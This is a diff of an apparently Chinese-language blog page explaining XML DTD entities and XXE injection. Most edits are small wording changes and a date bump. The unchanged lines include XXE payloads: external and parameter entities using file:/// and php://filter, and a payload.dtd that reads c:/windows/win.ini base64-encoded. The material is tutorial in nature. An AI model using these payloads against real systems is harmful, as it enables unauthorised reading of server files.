@@ -120,9 +120,9 @@ if (!doNotTrack) {
 
     
     <div class="float-md-right">
-      <span title="Lastmod: 2020-02-16. Published at: 2020-02-15.">
+      <span title="Lastmod: 2020-02-20. Published at: 2020-02-15.">
         
-          Lastmod: 2020-02-16
+          Lastmod: 2020-02-20
         
       </span>
     </div>
@@ -158,16 +158,17 @@ if (!doNotTrack) {
 <p>上面例子定义的普通实体，以 <code>&amp;&lt;name&gt;;</code>格式引用</p>
 <pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;content&gt;&amp;value;&lt;/content&gt;
 </code></pre><p><strong>参数实体</strong></p>
-<p>只在DTD内或元素的声明中使用，将实体的文本替换为实体引用，以 <code>%name;</code> 格式引用，注意ENTITY内定义带空格 <code>%空格name</code>，引用时不带空格 <code>%name;</code></p>
+<p>只在DTD内或元素的声明中使用，将实体的文本替换为实体引用，以 <code>%name;</code> 格式引用，注意定义时带空格 <code>%空格name</code>  、引用时不带空格加分号 <code>%name;</code></p>
 <pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ENTITY % area &quot;name, street, pincode, city&quot;&gt;
 &lt;!ENTITY % contact &quot;phone&quot;&gt;
 
 &lt;!ELEMENT office (%area;, %contact;)&gt;
 </code></pre><p>​</p>
 <h2 id="外部实体">外部实体</h2>
+<p><strong>格式</strong></p>
 <pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ENTITY aname SYSTEM &quot;URL/URI&quot;&gt;
 </code></pre><p>可使用伪协议，<code>file:///</code>或 <code>php://filter</code>等</p>
-<p>引入外部实体DTD文件，注意需要符合DTD规范</p>
+<p>使用参数实体引入外部实体DTD文件，注意需要符合DTD规范</p>
 <pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!DOCTYPE 根元素 [
     &lt;!ENTITY % ext SYSTEM &quot;URL/URI&quot;&gt;
     %ext;
@@ -212,7 +213,7 @@ if (!doNotTrack) {
 ]&gt;
 &lt;payload&gt;&amp;txt;&lt;/payload&gt;
 </code></pre><p>​</p>
-<p>payload.dtd构造</p>
+<p>构造 payload.dtd</p>
 <pre><code class="language-xml-dtd" data-lang="xml-dtd">&lt;!ENTITY txt SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/windows/win.ini&quot;&gt;
 
 &lt;!ENTITY % payload SYSTEM &quot;php://filter/read=convert.base64-encode/resource=c:/windows/win.ini&quot;&gt;
